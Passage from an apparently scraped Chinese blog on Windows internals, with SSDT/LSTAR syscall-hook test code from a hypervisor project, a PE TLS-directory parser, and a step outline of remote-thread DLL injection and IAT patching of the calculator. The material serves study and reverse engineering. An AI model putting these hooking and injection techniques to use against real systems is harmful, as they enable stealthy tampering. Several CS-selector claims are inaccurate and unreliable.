CS选择子在x86架构中，CS（Code Segment）是一种代码段寄存器，主要用于存储当前程序正在执行的代码所在的段的信息。CS选择子则是对CS寄存器进行访问的一种方式。 CS选择子是一个16位的数据结构，包含了以下信息： 段选择子：用于指向代码段的段描述符，其中包含了代码段的起始地址、大小、特权级等信息。 请求特权级（RPL）：用于指定代码段的访问权限，取值为0~3。 CS选择子可以通过一些指令读取或修改，例如LAR指令、LDS指令、LSS指令等。在进行指令跳转时，CPU会使用CS选择子来确定下一条指令的地址。因此，CS选择子的正确设置非常重要，对程序的执行具有至关重要的影响。 需要注意的是，CS选择子只是用于访问CS寄存器的一种方式，它并不是CS寄存器本身。CS寄存器还可以通过其他方式进行访问，例如POP CS指令、IRET指令等。 系统调用钩子123456789101112131415161718192021222324252627282930/// &lt;summary&gt;/// Hook specific SSDT entry/// &lt;/summary&gt;/// &lt;param name=&quot;index&quot;&gt;SSDT index&lt;/param&gt;/// &lt;param name=&quot;hookPtr&quot;&gt;Hook address&lt;/param&gt;/// &lt;param name=&quot;argCount&quot;&gt;Number of function arguments&lt;/param&gt;/// &lt;returns&gt;Status code&lt;/returns&gt;NTSTATUS SHHookSyscall( IN ULONG index, IN PVOID hookPtr, IN CHAR argCount )&#123; NTSTATUS status = STATUS_SUCCESS; if (index &gt; MAX_SYSCALL_INDEX || hookPtr == NULL)// 超过最大系统调用索引或者hook地址为空 return STATUS_INVALID_PARAMETER; KIRQL irql = KeGetCurrentIrql();// 获取当前IRQL（中断请求级别） if (irql &lt; DISPATCH_LEVEL) // 如果小于调度级别，提升到调度级别 irql = KeRaiseIrqlToDpcLevel(); // 保存原始hook地址和参数个数 // 保证多线程环境下对HookTable、ArgTble、HookEnabled的操作的原子性 InterlockedExchange64( (PLONG64)&amp;HookTable[index], (LONG64)hookPtr ); InterlockedExchange8( &amp;ArgTble[index], argCount ); InterlockedExchange8( &amp;HookEnabled[index], TRUE ); // 恢复权限 if (KeGetCurrentIrql() &gt; irql) KeLowerIrql( irql ); return status;&#125; hkNtClose12345NTSTATUS hkNtClose( HANDLE handle )&#123; calls1++;// 记录hkNtClose函数被调用的次数 return ((pfnNtClose)g_NtClose)(handle);// 使用函数指针类型pfnNtClose调用了全局变量g_NtClose所指向的原始NtClose系统调用函数，并将handle作为参数传递给原始函数&#125; hkNtClose2123456789101112NTSTATUS hkNtClose2( HANDLE handle )&#123; PPAGE_HOOK_ENTRY pEntry = PHGetHookEntry( g_NtClose );// 获取全局系统调用函数的hook entry if (pEntry) &#123; calls2++;// 记录hkNtClose2函数被调用的次数 // 使用函数指针类型pfnNtClose调用了hook entry的OriginalData字段所指向的原始NtClose系统调用函数，并将handle作为参数传递给原始函数 return ((pfnNtClose)pEntry-&gt;OriginalData)(handle); &#125; return STATUS_SUCCESS;&#125; 驱动卸载1234567891011VOID HBUnload( IN PDRIVER_OBJECT DriverObject )&#123; UNREFERENCED_PARAMETER( DriverObject ); TestPrintResults();// 打印测试结果 TestStop();// 停止测试 NTSTATUS status = StopHV();// 停止虚拟化 DPRINT( &quot;HyperBone: CPU %d: %s: Unload %s\\n&quot;, CPU_IDX, __FUNCTION__, NT_SUCCESS( status ) ? &quot;SUCCEDED&quot; : &quot;FAILED&quot; ); FreeGlobalData( g_Data );// 释放全局变量&#125; 打印测试结果12345VOID TestPrintResults()&#123; DPRINT( &quot;HyperBone: CPU %d: %s: SyscallHook Calls made %d\\n&quot;, CPU_IDX, __FUNCTION__, calls1 ); DPRINT( &quot;HyperBone: CPU %d: %s: PageHook Calls made %d\\n&quot;, CPU_IDX, __FUNCTION__, calls2 );&#125; 停止测试123456VOID TestStop()&#123; PHRestore( g_NtClose );// 恢复系统调用钩子 SHRestoreSyscall( SSDTIndex( &amp;ZwClose ) );// 恢复原始SSDT表入口 SHDestroyHook();// 释放LSTAR钩子&#125; 恢复SSDT表123456789101112131415161718192021222324252627/// &lt;summary&gt;/// Restore original SSDT entry/// &lt;/summary&gt;/// &lt;param name=&quot;index&quot;&gt;SSDT index&lt;/param&gt;/// &lt;returns&gt;Status code&lt;/returns&gt;NTSTATUS SHRestoreSyscall( IN ULONG index )&#123; // 检查最大系统调用索引 if (index &gt; MAX_SYSCALL_INDEX) return STATUS_INVALID_PARAMETER; // 检查权限 KIRQL irql = KeGetCurrentIrql(); if (irql &lt; DISPATCH_LEVEL) irql = KeRaiseIrqlToDpcLevel(); // 恢复原始系统调用表 InterlockedExchange8( &amp;HookEnabled[index], 0 ); InterlockedExchange8( &amp;ArgTble[index], 0 ); InterlockedExchange64( (PLONG64)&amp;HookTable[index], 0 ); // 还原权限 if( KeGetCurrentIrql() &gt; irql ) KeLowerIrql( irql ); return STATUS_SUCCESS;&#125; 释放LSTAR钩子1234567891011121314151617/// &lt;summary&gt;/// Unhook LSTAR/// &lt;/summary&gt;/// &lt;returns&gt;Status code&lt;/returns&gt;NTSTATUS SHDestroyHook()&#123; NTSTATUS status = STATUS_SUCCESS; if (KiSystemCall64Ptr != 0) // 有hook，DPC回调恢复原始LSTAR地址 KeGenericCallDpc( SHpHookCallbackDPC, NULL ); if (NT_SUCCESS( status )) // 取消钩子 KiSystemCall64Ptr = 0; return status;&#125;","categories":[{"name":"Windows Kernel","slug":"Windows-Kernel","permalink":"https://qianmuoy.github.io/categories/Windows-Kernel/"}],"tags":[]},{"title":"TLS","slug":"TLS","date":"2024-02-04T13:01:16.000Z","updated":"2024-02-04T13:01:53.858Z","comments":true,"path":"2024/02/04/TLS/","link":"","permalink":"https://qianmuoy.github.io/2024/02/04/TLS/","excerpt":"","text":"TLS线程局部存储，TLS 如何使用TLS 有静态方法和动态方法 静态方法 把全局变量数据类型前添加 __declspec(thread) 关键字，同一变量在不同的线程中各自使用自己的那一份，不同的线程间不会互相影响 使用这种方法，生成的PE文件在节头中会有.tls头 动态方法 存放索引 使用一个普通的全局变量，在创建线程前创建一个独立的索引 __ v2&#x3D;TlsAlloc()，根据索引设置数组的值 TlsSetValue( __ v2, 0) ,使用时使用a &#x3D; TlsGetValue(__ v2)获取 理论上没有.tls头出现，但是测试失败 TLS回调 调用约定为NTAPI，即_stdcall 只要有线程启动或销毁会自动调用线程回调，比EP进程初始化还要早（比主函数启动还早），许多逆向分析人员把这个特性用于反调试 TLS目录使用内存映射的方法进行分析 相当于系统自动申请内存，不用自己手动申请内存。获取内存映射句柄，使用MapViewOfFile获取虚拟地址位置 都是文件粒度对齐 对大文件操作效率更高 将内存粒度转换为文件粒度 DumpTlsDirectory是自己实现的 1234567891011121314151617181920212223242526272829303132333435363738void DumpTlsDirectory(PIMAGE_OPTIONAL_HEADER ImageOptionalHeader, LPBYTE ImageBase, DWORD Offset)&#123; BOOL IsWow64 = FALSE; //判断PE文件的位数 if (!IsOptionalHeaderPE32Plus(ImageOptionalHeader, &amp;IsWow64)) &#123; return; &#125; if (IsWow64 == FALSE) &#123; //x64 PIMAGE_TLS_DIRECTORY64 ImageTlsDirectory = (PIMAGE_TLS_DIRECTORY64)((DWORD_PTR)ImageBase + (DWORD_PTR)Offset); _tprintf(_T(&quot;StartAddressOfRawData: %p \\r\\nEndAddressOfRawData: %p \\r\\n&quot;), ImageTlsDirectory-&gt;StartAddressOfRawData, ImageTlsDirectory-&gt;EndAddressOfRawData); _tprintf(_T(&quot;AddressOfIndex: %p \\r\\nAddressOfCallBacks:%p \\r\\n&quot;), ImageTlsDirectory-&gt;AddressOfIndex, ImageTlsDirectory-&gt;AddressOfCallBacks); _tprintf(_T(&quot;SizeOfZeroFill: %u \\r\\nCharacteristics: %p \\r\\n&quot;), ImageTlsDirectory-&gt;SizeOfZeroFill, ImageTlsDirectory-&gt;Characteristics); &#125; else &#123; PIMAGE_TLS_DIRECTORY32 ImageTlsDirectory = (PIMAGE_TLS_DIRECTORY32)((DWORD_PTR)ImageBase + (DWORD_PTR)Offset); _tprintf(_T(&quot;StartAddressOfRawData: %p \\r\\nEndAddressOfRawData: %p \\r\\n&quot;), ImageTlsDirectory-&gt;StartAddressOfRawData, ImageTlsDirectory-&gt;EndAddressOfRawData); _tprintf(_T(&quot;AddressOfIndex: %p \\r\\nAddressOfCallBacks:%p \\r\\n&quot;), ImageTlsDirectory-&gt;AddressOfIndex, ImageTlsDirectory-&gt;AddressOfCallBacks); _tprintf(_T(&quot;SizeOfZeroFill: %u \\r\\nCharacteristics: %p \\r\\n&quot;), ImageTlsDirectory-&gt;SizeOfZeroFill, ImageTlsDirectory-&gt;Characteristics); &#125; return;&#125; 完整代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465#include &quot;pch.h&quot;void Sub_1(); //文件粒度void Sub_2(); //内存粒度BOOL RtlImageDirectoryEntryToData(PIMAGE_OPTIONAL_HEADER ImageOptionalHeader, int DirectoryIndex, PIMAGE_DATA_DIRECTORY ImageDataDirectory);DWORD Rva2Offset(DWORD Rva, UINT_PTR ImageBaseAddress);BOOL IsOptionalHeaderPE32Plus(PIMAGE_OPTIONAL_HEADER ImageOptionalHeader, BOOL* IsWow64);void DumpTlsDirectory(PIMAGE_OPTIONAL_HEADER ImageOptionalHeader, LPBYTE ImageBase, DWORD Offset);void DumpTlsDirectory2(PIMAGE_OPTIONAL_HEADER ImageOptionalHeader, LPBYTE ImageBase, DWORD VirtualAddress);LONGLONG AlignmentData(LONGLONG OperateLength, LONGLONG AlignmentLength);BOOL IsPEFile(LPVOID ImageBase, PIMAGE_NT_HEADERS&amp; ImageNtHeaders);int _tmain(int argc, TCHAR* argv[],TCHAR *envp[])&#123; setlocale(LC_ALL,&quot;Chinese-simplified&quot;); Sub_1(); //内存映射的方法分析TLS目录 Sub_2(); //文件读写的方法分析TLS目录 _tprintf(_T(&quot;Input AnyKey To Exit\\r\\n&quot;)); _gettchar(); return 0;&#125;void Sub_1()&#123; TCHAR ImageName[MAX_PATH] = _T(&quot;Test.exe&quot;); _tprintf(_T(&quot;ImageName: %s \\n&quot;), ImageName); HANDLE FileHandle = NULL; HANDLE MappingHandle = NULL; LPVOID ImageBase = NULL; PIMAGE_NT_HEADERS ImageNtHeaders = NULL; DWORD Offset = 0; IMAGE_DATA_DIRECTORY ImageDataDirectory = &#123; 0 &#125;; //打开文件并将其映射到内存中 FileHandle = CreateFile(ImageName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (FileHandle == INVALID_HANDLE_VALUE) &#123; _tprintf(_T(&quot;CreateFile() Error:%d \\r\\n&quot;), GetLastError()); goto Exit; &#125; //根据文件句柄创建内存映射对象获得内存映射句柄 MappingHandle = CreateFileMapping(FileHandle, NULL, PAGE_READONLY, 0, 0, NULL); if (MappingHandle == NULL) &#123; _tprintf(_T(&quot;CreateFileMapping() Error:%d \\r\\n&quot;), GetLastError()); goto Exit; &#125; ImageBase = MapViewOfFile(MappingHandle, FILE_MAP_READ, 0, 0, 0); //文件粒度对齐 if (ImageBase == NULL) &#123; _tprintf(_T(&quot;MapViewOfFile() Error:%d \\r\\n&quot;), GetLastError()); goto Exit; &#125; //是否为有效的PE可执行文件 if (!IsPEFile(ImageBase, ImageNtHeaders)) &#123; _tprintf(_T(&quot;IsPEFile() Error:%d \\r\\n&quot;), GetLastError()); goto Exit; &#125; //查看TLS目录 if (!RtlImageDirectoryEntryToData(&amp;ImageNtHeaders-&gt;OptionalHeader, IMAGE_DIRECTORY_ENTRY_TLS,&amp;ImageDataDirectory)) &#123; _tprintf(_T(&quot;GetTlsDirectoryRVA() Error\\r\\n&quot;)); goto Exit; &#125; //将内存粒度转换成文件粒度 Offset = Rva2Offset(ImageDataDirectory.VirtualAddress, (UINT_PTR)ImageBase); if (Offset&lt;=0) &#123; _tprintf(_T(&quot;Rva2Offset() Error\\r\\n&quot;)); goto Exit; &#125; //显示TLS目录信息 DumpTlsDirectory(&amp;ImageNtHeaders-&gt;OptionalHeader, (LPBYTE)ImageBase, Offset);Exit: //关闭句柄 if (ImageBase != NULL) &#123; UnmapViewOfFile(ImageBase); ImageBase = NULL; &#125; if (MappingHandle != NULL) &#123; CloseHandle(MappingHandle); MappingHandle = NULL; &#125; if (FileHandle != INVALID_HANDLE_VALUE) &#123; CloseHandle(FileHandle); FileHandle = INVALID_HANDLE_VALUE; &#125; _tprintf(_T(&quot;Please Input Anykey to Continue\\r\\n&quot;)); _gettchar(); return;&#125;BOOL IsPEFile(LPVOID ImageBase, PIMAGE_NT_HEADERS&amp; ImageNtHeaders)&#123; if (ImageBase == NULL) &#123; return FALSE; &#125; PIMAGE_DOS_HEADER ImageDosHeader = (PIMAGE_DOS_HEADER)ImageBase; if (ImageDosHeader-&gt;e_magic != IMAGE_DOS_SIGNATURE) &#123; return FALSE; &#125; ImageNtHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)ImageDosHeader + (DWORD_PTR)ImageDosHeader-&gt;e_lfanew); if (ImageNtHeaders-&gt;Signature != IMAGE_NT_SIGNATURE) &#123; return FALSE; &#125; return TRUE;&#125;BOOL RtlImageDirectoryEntryToData(PIMAGE_OPTIONAL_HEADER ImageOptionalHeader,int DirectoryIndex,PIMAGE_DATA_DIRECTORY ImageDataDirectory)&#123; if (ImageOptionalHeader == NULL) &#123; return FALSE; &#125; BOOL IsWow64 = FALSE; if (!IsOptionalHeaderPE32Plus(ImageOptionalHeader, &amp;IsWow64)) &#123; return FALSE; &#125; if (IsWow64==FALSE) &#123; PIMAGE_OPTIONAL_HEADER64 ImageOptionalHeader64 = (PIMAGE_OPTIONAL_HEADER64)ImageOptionalHeader; memcpy(ImageDataDirectory, &amp;ImageOptionalHeader64-&gt;DataDirectory[DirectoryIndex], sizeof(IMAGE_DATA_DIRECTORY)); &#125; else &#123; PIMAGE_OPTIONAL_HEADER32 ImageOptionalHeader32 = (PIMAGE_OPTIONAL_HEADER32)ImageOptionalHeader; memcpy(ImageDataDirectory, &amp;ImageOptionalHeader32-&gt;DataDirectory[DirectoryIndex], sizeof(IMAGE_DATA_DIRECTORY)); &#125; if ((ImageDataDirectory-&gt;VirtualAddress == 0) &amp;&amp; (ImageDataDirectory-&gt;Size == 0)) &#123; //这个目录不存在 return TRUE; &#125; else if ((ImageDataDirectory-&gt;VirtualAddress == 0) || (ImageDataDirectory-&gt;Size == 0)) &#123; //数据目录中的数据不一致 return FALSE; &#125; else if (ImageDataDirectory-&gt;Size &lt; (IsWow64 ? sizeof(IMAGE_TLS_DIRECTORY32) : sizeof(IMAGE_TLS_DIRECTORY64))) &#123; //查看目录大小是否合理 return FALSE; &#125; return TRUE;&#125;DWORD Rva2Offset(DWORD Rva, UINT_PTR ImageBaseAddress)&#123; WORD i = 0; WORD NumberOfSections = 0; PIMAGE_SECTION_HEADER ImageSectionHeader = NULL; PIMAGE_NT_HEADERS ImageNtHeaders = (PIMAGE_NT_HEADERS)(ImageBaseAddress + ((PIMAGE_DOS_HEADER)ImageBaseAddress)-&gt;e_lfanew); if (ImageNtHeaders-&gt;OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC) // PE32 &#123; PIMAGE_NT_HEADERS32 ImageNtHeaders32 = (PIMAGE_NT_HEADERS32)ImageNtHeaders; ImageSectionHeader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&amp;ImageNtHeaders32-&gt;OptionalHeader) + ImageNtHeaders32-&gt;FileHeader.SizeOfOptionalHeader); NumberOfSections = ImageNtHeaders32-&gt;FileHeader.NumberOfSections; &#125; else if (ImageNtHeaders-&gt;OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) // PE64 &#123; PIMAGE_NT_HEADERS64 ImageNtHeaders64 = (PIMAGE_NT_HEADERS64)ImageNtHeaders; ImageSectionHeader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&amp;ImageNtHeaders64-&gt;OptionalHeader) + ImageNtHeaders64-&gt;FileHeader.SizeOfOptionalHeader); NumberOfSections = ImageNtHeaders64-&gt;FileHeader.NumberOfSections; &#125; else &#123; return 0; &#125; if (Rva &lt; ImageSectionHeader[0].PointerToRawData) return Rva; for (i = 0; i &lt; NumberOfSections; i++) &#123; if (Rva &gt;= ImageSectionHeader[i].VirtualAddress &amp;&amp; Rva &lt; (ImageSectionHeader[i].VirtualAddress + ImageSectionHeader[i].SizeOfRawData)) &#123; return (Rva - ImageSectionHeader[i].VirtualAddress + ImageSectionHeader[i].PointerToRawData); &#125; &#125; return 0;&#125;BOOL IsOptionalHeaderPE32Plus(PIMAGE_OPTIONAL_HEADER ImageOptionalHeader, BOOL* IsWow64)&#123; //#define IMAGE_ROM_OPTIONAL_HDR_MAGIC 0x107 ROM映像不处理 if (ImageOptionalHeader-&gt;Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC) &#123; // PE32 *IsWow64 = TRUE; &#125; else if (ImageOptionalHeader-&gt;Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) &#123; // PE64 *IsWow64 = FALSE; &#125; else &#123; // 无法判断 返回失败 *IsWow64 = FALSE; return FALSE; &#125; return TRUE;&#125;void DumpTlsDirectory(PIMAGE_OPTIONAL_HEADER ImageOptionalHeader, LPBYTE ImageBase, DWORD Offset)&#123; BOOL IsWow64 = FALSE; //判断PE文件的位数 if (!IsOptionalHeaderPE32Plus(ImageOptionalHeader, &amp;IsWow64)) &#123; return; &#125; if (IsWow64 == FALSE) &#123; //x64 PIMAGE_TLS_DIRECTORY64 ImageTlsDirectory = (PIMAGE_TLS_DIRECTORY64)((DWORD_PTR)ImageBase + (DWORD_PTR)Offset); _tprintf(_T(&quot;StartAddressOfRawData: %p \\r\\nEndAddressOfRawData: %p \\r\\n&quot;), ImageTlsDirectory-&gt;StartAddressOfRawData, ImageTlsDirectory-&gt;EndAddressOfRawData); _tprintf(_T(&quot;AddressOfIndex: %p \\r\\nAddressOfCallBacks:%p \\r\\n&quot;), ImageTlsDirectory-&gt;AddressOfIndex, ImageTlsDirectory-&gt;AddressOfCallBacks); _tprintf(_T(&quot;SizeOfZeroFill: %u \\r\\nCharacteristics: %p \\r\\n&quot;), ImageTlsDirectory-&gt;SizeOfZeroFill, ImageTlsDirectory-&gt;Characteristics); &#125; else &#123; PIMAGE_TLS_DIRECTORY32 ImageTlsDirectory = (PIMAGE_TLS_DIRECTORY32)((DWORD_PTR)ImageBase + (DWORD_PTR)Offset); _tprintf(_T(&quot;StartAddressOfRawData: %p \\r\\nEndAddressOfRawData: %p \\r\\n&quot;), ImageTlsDirectory-&gt;StartAddressOfRawData, ImageTlsDirectory-&gt;EndAddressOfRawData); _tprintf(_T(&quot;AddressOfIndex: %p \\r\\nAddressOfCallBacks:%p \\r\\n&quot;), ImageTlsDirectory-&gt;AddressOfIndex, ImageTlsDirectory-&gt;AddressOfCallBacks); _tprintf(_T(&quot;SizeOfZeroFill: %u \\r\\nCharacteristics: %p \\r\\n&quot;), ImageTlsDirectory-&gt;SizeOfZeroFill, ImageTlsDirectory-&gt;Characteristics); &#125; return;&#125;//内存对齐void Sub_2()&#123; TCHAR ImageName[MAX_PATH] = _T(&quot;Test.exe&quot;); _tprintf(_T(&quot;ImageName: %s \\r\\n&quot;), ImageName); HANDLE FileHandle = INVALID_HANDLE_VALUE; LPVOID v1 = NULL; LPVOID ImageBase = NULL; PIMAGE_NT_HEADERS ImageNtHeaders = NULL; PIMAGE_SECTION_HEADER ImageSectionHeader = NULL; DWORD FileLength = -1; DWORD ReturnLength = -1; DWORD NumberOfSections = -1; DWORD ImageSize = -1; DWORD SizeOfImage = -1; IMAGE_DATA_DIRECTORY ImageDataDirectory = &#123; 0 &#125;; //将整个文件内容读取到内存中 FileHandle = CreateFile(ImageName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, 0); if (FileHandle == INVALID_HANDLE_VALUE) &#123; _tprintf(_T(&quot;CreateFile() Error:%d \\r\\n&quot;), GetLastError()); goto Exit; &#125; FileLength = GetFileSize(FileHandle, NULL); //FileSize = 67072 if (FileLength == INVALID_FILE_SIZE) //#define INVALID_FILE_SIZE ((DWORD)0xFFFFFFFF) &#123; _tprintf(_T(&quot;GetFileSize() Error:%d \\r\\n&quot;), GetLastError()); goto Exit; &#125; v1 = GlobalAlloc(GMEM_FIXED | GMEM_ZEROINIT, FileLength); if (v1 == NULL) &#123; _tprintf(_T(&quot;GlobalAlloc() Error:%d \\r\\n&quot;), GetLastError()); goto Exit; &#125; if (!ReadFile(FileHandle, v1, FileLength, &amp;ReturnLength, NULL)) &#123; _tprintf(_T(&quot;ReadFile() Error:%d \\r\\n&quot;), GetLastError()); goto Exit; &#125; if (FileLength != ReturnLength) &#123; //FileSize = 67072 //RealReadSize = 67072 _tprintf(_T(&quot;ReadFile() Error:%d \\r\\n&quot;), GetLastError()); goto Exit; &#125; //获得Nt头地址 ImageNtHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)v1 + ((PIMAGE_DOS_HEADER)v1)-&gt;e_lfanew); //获得节表起始地址 ImageSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)&amp;ImageNtHeaders-&gt;OptionalHeader + (DWORD_PTR)ImageNtHeaders-&gt;FileHeader.SizeOfOptionalHeader); //获得PE文件中节的个数 NumberOfSections = ImageNtHeaders-&gt;FileHeader.NumberOfSections; //NumberOfSections = 11 //最后一个节的RVA 加上 该节数据相对内存对齐粒度对齐后的值 -&gt; 该PE文件加载到内存后所占内存的总大小 ImageSize = ImageSectionHeader[NumberOfSections - 1].VirtualAddress + AlignmentData(ImageSectionHeader[NumberOfSections - 1].SizeOfRawData, ImageNtHeaders-&gt;OptionalHeader.SectionAlignment); //ImageOptionalHeader的成员SizeOfImage 内存中PE文件的总大小(必须保证内存对齐) SizeOfImage = AlignmentData(ImageNtHeaders-&gt;OptionalHeader.SizeOfImage, ImageNtHeaders-&gt;OptionalHeader.SectionAlignment); //通常以上两种方法得到的两个值是相等的,如果不等则取较大的一个 if (SizeOfImage &lt; ImageSize) &#123; //ImageSize = 163840 //CalculateImageSize = 163840 SizeOfImage = ImageSize; &#125; //分配内存空间,并将其全部初始化为0 ImageBase = GlobalAlloc(GMEM_FIXED | GMEM_ZEROINIT, ImageSize); if (ImageBase == NULL) &#123; _tprintf(_T(&quot;GlobalAlloc() Error:%d \\r\\n&quot;), GetLastError()); goto Exit; &#125; //将 头+节表 复制到申请的内存中 memcpy(ImageBase, v1, ImageNtHeaders-&gt;OptionalHeader.SizeOfHeaders); //将各个节数据复制到内存中 for (int i = 0; i &lt; NumberOfSections; i++) &#123; memcpy((PBYTE)ImageBase + ImageSectionHeader[i].VirtualAddress, //节在内存中的起始处(目标) (PBYTE)v1 + ImageSectionHeader[i].PointerToRawData, //节在文件中的起始处(源数据) ImageSectionHeader[i].SizeOfRawData); //节数据的大小 &#125; //查找TLS目录的RVA和大小 if (!RtlImageDirectoryEntryToData(&amp;ImageNtHeaders-&gt;OptionalHeader, IMAGE_DIRECTORY_ENTRY_TLS, &amp;ImageDataDirectory)) &#123; _tprintf(_T(&quot;GetTlsDirectoryRVA() Error\\r\\n&quot;)); goto Exit; &#125; //显示TLS目录信息 DumpTlsDirectory2(&amp;ImageNtHeaders-&gt;OptionalHeader, (LPBYTE)ImageBase,ImageDataDirectory.VirtualAddress);Exit: //关闭句柄 释放内存 if (ImageBase != NULL) &#123; GlobalFree(ImageBase); ImageBase = NULL; &#125; if (v1 != NULL) &#123; GlobalFree(v1); v1 = NULL; &#125; if (FileHandle != INVALID_HANDLE_VALUE) &#123; CloseHandle(FileHandle); FileHandle = INVALID_HANDLE_VALUE; &#125; _tprintf(_T(&quot;Please Input Anykey to Exit\\r\\n&quot;)); _gettchar(); return;&#125;void DumpTlsDirectory2(PIMAGE_OPTIONAL_HEADER ImageOptionalHeader, LPBYTE ImageBase, DWORD VirtualAddress)&#123; BOOL IsWow64 = FALSE; if (!IsOptionalHeaderPE32Plus(ImageOptionalHeader, &amp;IsWow64)) &#123; return; &#125; if (IsWow64==FALSE) &#123; PIMAGE_TLS_DIRECTORY64 ImageTlsDirectory = (PIMAGE_TLS_DIRECTORY64)((DWORD_PTR)ImageBase + (DWORD_PTR)VirtualAddress); _tprintf(_T(&quot;StartAddressOfRawData: %p \\r\\nEndAddressOfRawData: %p \\r\\n&quot;), ImageTlsDirectory-&gt;StartAddressOfRawData, ImageTlsDirectory-&gt;EndAddressOfRawData); _tprintf(_T(&quot;AddressOfIndex: %p \\r\\nAddressOfCallBacks:%p \\r\\n&quot;), ImageTlsDirectory-&gt;AddressOfIndex, ImageTlsDirectory-&gt;AddressOfCallBacks); _tprintf(_T(&quot;SizeOfZeroFill: %u \\r\\nCharacteristics: %p \\r\\n&quot;), ImageTlsDirectory-&gt;SizeOfZeroFill, ImageTlsDirectory-&gt;Characteristics); &#125; else &#123; PIMAGE_TLS_DIRECTORY32 ImageTlsDirectory = (PIMAGE_TLS_DIRECTORY32)((DWORD_PTR)ImageBase + (DWORD_PTR)VirtualAddress); _tprintf(_T(&quot;StartAddressOfRawData: %p \\r\\nEndAddressOfRawData: %p \\r\\n&quot;), ImageTlsDirectory-&gt;StartAddressOfRawData, ImageTlsDirectory-&gt;EndAddressOfRawData); _tprintf(_T(&quot;AddressOfIndex: %p \\r\\nAddressOfCallBacks:%p \\r\\n&quot;), ImageTlsDirectory-&gt;AddressOfIndex, ImageTlsDirectory-&gt;AddressOfCallBacks); _tprintf(_T(&quot;SizeOfZeroFill: %u \\r\\nCharacteristics: %p \\r\\n&quot;), ImageTlsDirectory-&gt;SizeOfZeroFill, ImageTlsDirectory-&gt;Characteristics); &#125; return;&#125;//以AlignmentLength对齐OperateLength, 让OperateLength为AlignmentLength的整数倍LONGLONG AlignmentData(LONGLONG OperateLength, LONGLONG AlignmentLength)&#123; if (AlignmentLength == 0) &#123; return OperateLength; &#125; int v1 = OperateLength % AlignmentLength; if (v1 != 0) &#123; return OperateLength + AlignmentLength - v1; &#125; return OperateLength;&#125;","categories":[{"name":"Windows Programming","slug":"Windows-Programming","permalink":"https://qianmuoy.github.io/categories/Windows-Programming/"}],"tags":[]},{"title":"Hook计算器以显示中文数字","slug":"Hook计算器以显示中文数字","date":"2024-02-04T12:55:21.000Z","updated":"2024-02-04T12:55:42.164Z","comments":true,"path":"2024/02/04/Hook计算器以显示中文数字/","link":"","permalink":"https://qianmuoy.github.io/2024/02/04/Hook%E8%AE%A1%E7%AE%97%E5%99%A8%E4%BB%A5%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E6%95%B0%E5%AD%97/","excerpt":"","text":"计算器显示中文数字HookLet注入DLL.dll到计算器程序 找到导入表描述，在FirstThunk中把user32.dll文件中导出函数地址改为自己的DLL.dll导出函数的地址 计算器点击数字调用的函数为SetWindowText 注入方式有两种，CreateRemoteThread远程线程，SetWindowHookEx全局钩子 提权，开启UAC 管理员身份运行 可以在项目右键属性，链接器，清单文件，打开UAC运行级别即可 这里使用远程线程注入，填写动态库的完整路径申请内存，在对方进程中开启新的线程，得到LoadLibrary地址，执行LoadLibrary加载自己的动态库 得到自己动态库的完整路径 得到PID 申请虚拟内存 将路径写入虚拟内存 启动线程 从目标进程中的user32模块导出表中获取SetWindowText函数地址 获得进程中第一个模块Taskmgr.exe地址 定位到导入表描述 该模块是加载状态的，因此定位到FirstThunk，里面已经变为真正的函数地址，判断是否为空 定位到模块名 比较得到与我们要感染的模块相同，此时ImageImportDescriptor指针指向的FirstThunk即为对应模块 获取user32导出表中SetWindowText函数地址 定位FirstThunk指向的IMAGE_THUNK_DATA，此处就是函数的地址 遍历这部分IAT表，ImageThunkData-&gt;u1.Function与获取到的地址进行比较 IAT表不可写，修改内存属性 API函数入口地址改成我们构造的函数的地址。函数的实际地址是函数指针名加jmp指令E9后的数字再加5 导入表卸载 修改内存包含属性 将修改过的地址改为原本的地址","categories":[{"name":"Windows Programming","slug":"Windows-Programming","permalink":"https://qianmuoy.github.io/categories/Windows-Programming/"}],"tags":[]},{"title":"PE文件格式","slug":"PE文件格式","date":"2024-02-04T12:51:11.000Z","updated":"2024-02-04T12:52:50.010Z","comments":true,"path":"2024/02/04/PE文件格式/","link":"","permalink":"https://qianmuoy.github.io/2024/02/04/PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/","excerpt":"","text":"PE此文章为自查文章，部分内容没有详细解释。具体概念出自李承远《逆向工程核心原理》。 .exe .dll .sys PE或PE+，注意没有PE64 C:\\Windows\\system32\\notepad.exe &#x2F;&#x2F;32位 C:\\Windows\\syswow64\\notepad.exe &#x2F;&#x2F;64位 PE文件的标志 PE格式文件加载到内存中的情形 DOS头 windows.h中有定义 _IMAGE_DOS_HEADE NULL区域是未使用的区域用0填充的，补齐文件或内存粒度对齐 重点关注0x00 word e_magic&#x3D;0x5a4d 对应MZ, 和dword(long)0x3c e_ifanew, (PIMAGE_NT_HEADERS）(BYTE)ImageDosHeader+(ImagerDosHeader-&gt;e_ifanew)就是NT_Headers的地址* 